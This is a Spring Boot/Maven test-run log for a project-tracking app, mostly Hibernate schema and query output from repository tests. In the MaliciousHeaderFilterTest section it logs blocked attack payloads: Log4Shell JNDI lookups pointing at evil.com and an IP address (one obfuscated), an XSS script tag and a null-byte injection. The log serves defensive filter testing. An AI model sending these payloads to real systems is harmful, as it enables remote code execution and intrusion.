Hibernate: alter table if exists metric_data_points add constraint FKcoeeu7cfo2ser9fpwkjtvt2qk foreign key (metric_id) references custom_metrics
Hibernate: alter table if exists password_reset_tokens add constraint FKk3ndxg5xp6v7wd4gjyusp15gq foreign key (user_id) references users
Hibernate: alter table if exists pitch_github_links add constraint FKdbiqt4450eghw4d6qnr1aesfa foreign key (branch_id) references github_branches
Hibernate: alter table if exists pitch_github_links add constraint FK7tjyl6do8wgrcu8qwo818nmao foreign key (commit_id) references github_commits
Hibernate: alter table if exists pitch_github_links add constraint FKohmupop57ndrbbxvn14cbjcp2 foreign key (linked_by_user_id) references users
Hibernate: alter table if exists pitch_github_links add constraint FK5ok5tg9mw2bb0yvrba1fw9jx2 foreign key (pitch_id) references pitches
Hibernate: alter table if exists pitch_github_links add constraint FK4x1gd532hfof0b5vm54wfduf9 foreign key (pull_request_id) references github_pull_requests
Hibernate: alter table if exists pitches add constraint FK4u54s2sn5ch2eaqrbgofo9ljq foreign key (cycle_id) references cycles
Hibernate: alter table if exists pitches add constraint FKkn4c1du3iqjdp41ekcqcwfeph foreign key (team_id) references teams
Hibernate: alter table if exists projects add constraint FKmueqy6cpcwpfl8gnnag4idjt9 foreign key (owner_id) references users
Hibernate: alter table if exists retro_item_votes add constraint FK2khkw0wa1m9d9vwu1nsl0gxab foreign key (retro_item_id) references retro_items
Hibernate: alter table if exists retro_item_votes add constraint FK1m3vg688qjdk6phw5bml6xj2p foreign key (user_id) references users
Hibernate: alter table if exists retro_items add constraint FKsia9ldxr2eshplib7fq2shb8d foreign key (author_id) references users
Hibernate: alter table if exists retro_items add constraint FKiemll1hc49luwc2kbxp37j9v4 foreign key (merged_into_id) references retro_items
Hibernate: alter table if exists retro_items add constraint FKdo4863xupl0eu5v2r9ai8s0yg foreign key (retrospective_id) references retrospectives
Hibernate: alter table if exists retrospectives add constraint FKss0qryt5jevhvh6gweumun1dr foreign key (created_by_id) references users
Hibernate: alter table if exists retrospectives add constraint FKncvcf1okubp961jsgn47vewvw foreign key (cycle_id) references cycles
Hibernate: alter table if exists retrospectives add constraint FKcfwh1dn75i508xla1c701c2x6 foreign key (project_id) references projects
Hibernate: alter table if exists risk_feedback add constraint FKsn2hbwd1g7u19b57jsb02xjf8 foreign key (pitch_id) references pitches
Hibernate: alter table if exists risk_feedback add constraint FKh6lx013xejhjy34h0292d0bbg foreign key (user_id) references users
Hibernate: alter table if exists slack_channel_config add constraint FK7awwotu60y0wnxi8ts7t6qg8s foreign key (slack_config_id) references slack_configuration
Hibernate: alter table if exists slack_notification_history add constraint FKj2ojpf45ut1japqtjmopa0xgp foreign key (slack_config_id) references slack_configuration
Hibernate: alter table if exists task_dependencies add constraint FKn3rbpgxtn1n799s16831iq5fu foreign key (source_task_id) references tasks
Hibernate: alter table if exists task_dependencies add constraint FKs9vm6h8ay9r2w0h050gwj9tkk foreign key (target_task_id) references tasks
Hibernate: alter table if exists task_github_links add constraint FKg2d3r82jadeb0s0au9d3l5eoa foreign key (branch_id) references github_branches
Hibernate: alter table if exists task_github_links add constraint FK6gsro73xfacmqja9bp7jpm5ew foreign key (commit_id) references github_commits
Hibernate: alter table if exists task_github_links add constraint FKr4gg8iy853p4sk7h583cubjd1 foreign key (linked_by_user_id) references users
Hibernate: alter table if exists task_github_links add constraint FK60f6jlm35n06r7p0226mck9in foreign key (pull_request_id) references github_pull_requests
Hibernate: alter table if exists task_github_links add constraint FKg6jj8ex2ok7901e7xwphhj1er foreign key (task_id) references tasks
Hibernate: alter table if exists tasks add constraint FK57jw5kurttogoboebwcpbo5mc foreign key (assignee_id) references persons
Hibernate: alter table if exists tasks add constraint FKtr4nlclifvs464db1wcolhpg9 foreign key (created_by_id) references persons
Hibernate: alter table if exists tasks add constraint FKr3xbxoo308jnay7d9g38etmmq foreign key (cycle_id) references cycles
Hibernate: alter table if exists tasks add constraint FKtqo1kgquxjtnn3t2wybyt7ly1 foreign key (pair_assignee_id) references persons
Hibernate: alter table if exists tasks add constraint FK76tiq4q248au3u79a8nkexoth foreign key (parent_task_id) references tasks
Hibernate: alter table if exists tasks add constraint FK9qacefoim1ijsx97kg3b3rapd foreign key (pitch_id) references pitches
Hibernate: alter table if exists tasks add constraint FKr5statc3aml9i8yo297f3y3wp foreign key (scope_id) references hill_chart_points
Hibernate: alter table if exists team_assignments add constraint FKlferf8h8v03eip0jtfa58scq6 foreign key (person_id) references persons
Hibernate: alter table if exists team_assignments add constraint FK5s4ux99gt87uyohj7vx87prmp foreign key (team_id) references teams
Hibernate: alter table if exists teams add constraint FKmywvsqkm3497yby6h32xbqhgh foreign key (cycle_id) references cycles
Hibernate: alter table if exists teams_channel_config add constraint FKsdxm5lijoe6c1eimri12rusph foreign key (teams_config_id) references teams_configuration
Hibernate: alter table if exists teams_notification_history add constraint FKsxrwfbj0qalt4yfvjayor4kx9 foreign key (teams_config_id) references teams_configuration
Hibernate: alter table if exists test_cases add constraint FKee6n94nij5fn9fbiyysuusxm foreign key (created_by_id) references users
Hibernate: alter table if exists test_cases add constraint FKqfd0ku940dd91oqjbv8u8glw foreign key (cycle_id) references cycles
Hibernate: alter table if exists test_cases add constraint FKkdord743tl34sk4qhm1hk34k4 foreign key (pitch_id) references pitches
Hibernate: alter table if exists test_cases add constraint FKf79tyvgu9xq41m5yxw5bntoab foreign key (scope_id) references hill_chart_points
Hibernate: alter table if exists test_cases add constraint FKgjhatabmie9j4j3v1x78oprv1 foreign key (task_id) references tasks
Hibernate: alter table if exists test_cases add constraint FKdkd4ldkawc7b9txfobigj5cxh foreign key (team_id) references teams
Hibernate: alter table if exists test_cases add constraint FKd50smbvhadpgnlmwc8i4m8d1h foreign key (updated_by_id) references users
Hibernate: alter table if exists test_runs add constraint FKmicq7qysi8jwmlba1xevyi27o foreign key (cycle_id) references cycles
Hibernate: alter table if exists test_runs add constraint FKdp0op08i9fysptp25k5nj1pf8 foreign key (executed_by_id) references users
Hibernate: alter table if exists test_runs add constraint FKsl4c748r65uilxrdtlxaaego foreign key (pitch_id) references pitches
Hibernate: alter table if exists test_runs add constraint FKfl653w755sstpt6528kpb1l0b foreign key (test_case_id) references test_cases
Hibernate: alter table if exists user_preferences add constraint FKepakpib0qnm82vmaiismkqf88 foreign key (user_id) references users
Hibernate: alter table if exists users add constraint FKmvbq8q4vpi6csivw9wcnq6ho5 foreign key (person_id) references persons
Hibernate: alter table if exists work_log_timers add constraint FKt06ofv4x8rimr347rf9cl6q3u foreign key (person_id) references persons
Hibernate: alter table if exists work_log_timers add constraint FK87n9s59ykt6w2bpqjtsmrectr foreign key (pitch_id) references pitches
Hibernate: alter table if exists work_log_timers add constraint FKwm154evo1p2gyso4yucvx760 foreign key (task_id) references tasks
Hibernate: alter table if exists work_logs add constraint FKtkbwgnxlhmfx2oxrmh8uyj4jb foreign key (person_id) references persons
Hibernate: alter table if exists work_logs add constraint FKbn4dxogg0e1nc7xr6ihha0uiw foreign key (pitch_id) references pitches
Hibernate: alter table if exists work_logs add constraint FKnr36yywrumho6jtiwxw25swb9 foreign key (task_id) references tasks
2026-01-17T23:26:19.847Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.repository.PitchRepositoryTest   : Started PitchRepositoryTest in 4.216 seconds (process running for 5.299)
OpenJDK 64-Bit Server VM warning: Sharing is only supported for boot loader classes because bootstrap classpath has been appended
WARNING: A Java agent has been loaded dynamically (/Users/farzad/.m2/repository/net/bytebuddy/byte-buddy-agent/1.14.10/byte-buddy-agent-1.14.10.jar)
WARNING: If a serviceability tool is in use, please run with -XX:+EnableDynamicAgentLoading to hide this warning
WARNING: If a serviceability tool is not in use, please run with -Djdk.instrument.traceUsage for more information
WARNING: Dynamic loading of agents will be disallowed by default in a future release
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0 left join cycles c1_0 on c1_0.id=p1_0.cycle_id where c1_0.id=? and p1_0.status in (?,?)
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0 left join teams t1_0 on t1_0.id=p1_0.team_id where t1_0.id=?
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0 left join cycles c1_0 on c1_0.id=p1_0.cycle_id where c1_0.id=?
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into pitches (appetite_days,circuit_breaker_date,circuit_breaker_reason,created_at,cycle_id,description,is_circuit_breaker_triggered,no_gos,problem_statement,rabbit_holes,risks,solution,status,team_id,title,updated_at,wireframe_links,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)
Hibernate: select p1_0.id,p1_0.appetite_days,p1_0.circuit_breaker_date,p1_0.circuit_breaker_reason,p1_0.created_at,p1_0.cycle_id,p1_0.description,p1_0.is_circuit_breaker_triggered,p1_0.no_gos,p1_0.problem_statement,p1_0.rabbit_holes,p1_0.risks,p1_0.solution,p1_0.status,p1_0.team_id,p1_0.title,p1_0.updated_at,p1_0.wireframe_links from pitches p1_0 left join cycles c1_0 on c1_0.id=p1_0.cycle_id where c1_0.id=? and p1_0.status in (?,?)
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 5.055 s -- in com.github.farzadsedaghatbin.shipflow.repository.PitchRepositoryTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.repository.TeamRepositoryTest
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into teams (cycle_id,name,id) values (?,?,default)
Hibernate: select t1_0.id,t1_0.cycle_id,t1_0.name from teams t1_0 left join cycles c1_0 on c1_0.id=t1_0.cycle_id where c1_0.id=?
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.037 s -- in com.github.farzadsedaghatbin.shipflow.repository.TeamRepositoryTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.repository.CycleRepositoryTest
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0 order by c1_0.start_date desc
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0 where c1_0.is_active
Hibernate: select c1_0.id,c1_0.end_date,c1_0.is_active,c1_0.name,c1_0.phase,c1_0.project_id,c1_0.start_date from cycles c1_0
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
Hibernate: insert into cycles (end_date,is_active,name,phase,project_id,start_date,id) values (?,?,?,?,?,?,default)
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.029 s -- in com.github.farzadsedaghatbin.shipflow.repository.CycleRepositoryTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilterTest
2026-01-17T23:26:20.813Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : 🚨 SECURITY ALERT: Malicious request blocked
2026-01-17T23:26:20.813Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Source IP: 192.168.1.100
2026-01-17T23:26:20.813Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Request URI: /api/qa/ask
2026-01-17T23:26:20.814Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Method: GET
2026-01-17T23:26:20.814Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Malicious Header/Field: Referer
2026-01-17T23:26:20.814Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Payload: ldap://malicious.server.com/payload
2026-01-17T23:26:20.814Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : User-Agent: null
2026-01-17T23:26:20.825Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : 🚨 SECURITY ALERT: Malicious request blocked
2026-01-17T23:26:20.825Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Source IP: 31.57.109.131
2026-01-17T23:26:20.826Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Request URI: /api/qa/ask
2026-01-17T23:26:20.826Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Method: POST
2026-01-17T23:26:20.826Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Malicious Header/Field: X-Forwarded-Host
2026-01-17T23:26:20.826Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Payload: ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/Exploit}
2026-01-17T23:26:20.826Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : User-Agent: null
2026-01-17T23:26:20.829Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : 🚨 SECURITY ALERT: Malicious request blocked
2026-01-17T23:26:20.830Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Source IP: 192.168.1.100
2026-01-17T23:26:20.830Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Request URI: /api/qa/ask
2026-01-17T23:26:20.830Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Method: GET
2026-01-17T23:26:20.830Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Malicious Header/Field: User-Agent
2026-01-17T23:26:20.830Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Payload: <script>alert('XSS')</script>
2026-01-17T23:26:20.830Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : User-Agent: <script>alert('XSS')</script>
2026-01-17T23:26:20.833Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : 🚨 SECURITY ALERT: Malicious request blocked
2026-01-17T23:26:20.834Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Source IP: 31.57.109.131
2026-01-17T23:26:20.834Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Request URI: /api/qa/ask
2026-01-17T23:26:20.834Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Method: POST
2026-01-17T23:26:20.834Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Malicious Header/Field: X-Forwarded-Host
2026-01-17T23:26:20.834Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Payload: ${jndi:ldap://evil.com:1389/Exploit}
2026-01-17T23:26:20.834Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : User-Agent: null
2026-01-17T23:26:20.843Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : 🚨 SECURITY ALERT: Malicious request blocked
2026-01-17T23:26:20.843Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Source IP: 192.168.1.100
2026-01-17T23:26:20.843Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Request URI: /api/qa/ask
2026-01-17T23:26:20.843Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Method: GET
2026-01-17T23:26:20.843Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Malicious Header/Field: X-Forwarded-Host
2026-01-17T23:26:20.843Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : Payload: legitimate%00malicious
2026-01-17T23:26:20.843Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.security.MaliciousHeaderFilter   : User-Agent: null
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.346 s -- in com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilterTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.ShipFlowApplicationTests

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:20.913Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.ShipFlowApplicationTests  : Starting ShipFlowApplicationTests using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:20.913Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.ShipFlowApplicationTests  : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:20.913Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.ShipFlowApplicationTests  : The following 1 profile is active: "test"
2026-01-17T23:26:22.264Z  INFO 89700 --- [shipflow] [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2026-01-17T23:26:22.265Z  INFO 89700 --- [shipflow] [           main] o.h.c.internal.RegionFactoryInitiator    : HHH000026: Second-level cache disabled
2026-01-17T23:26:22.269Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
2026-01-17T23:26:22.282Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-1 - Added connection conn20: url=jdbc:h2:mem:testdb user=SA
2026-01-17T23:26:22.283Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
